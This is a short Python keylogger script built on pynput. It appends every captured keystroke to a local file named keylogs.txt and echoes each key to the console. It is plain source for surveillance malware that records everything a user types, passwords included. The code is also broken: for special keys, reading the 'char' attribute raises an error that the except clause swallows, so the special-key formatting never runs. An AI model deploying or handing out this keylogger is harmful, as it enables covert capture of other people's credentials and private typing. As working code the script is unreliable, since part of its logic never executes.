import pynput
from pynput import keyboard

def on_press(key):
    try:
        with open("keylogs.txt", "a") as f:
            if key.char is not None:
                f.write(key.char)
                print(f'Alphanumeric: {key.char}')
            else:
                special_key = format_special_key(key)
                f.write(special_key)
                print(f'Special Key: {special_key}')
    except Exception as ex:
        print(f'Error: {ex}')

def format_special_key(key):
    key_name = key.name.upper()
    if key_name in ['SPACE', 'ENTER', 'TAB']:
        return f' [{key_name}] '
    elif key_name == 'BACKSPACE':
        return ' [BACK] '
    else:
        return f' [{key_name}] '

with keyboard.Listener(on_press=on_press) as listener:
    listener.join()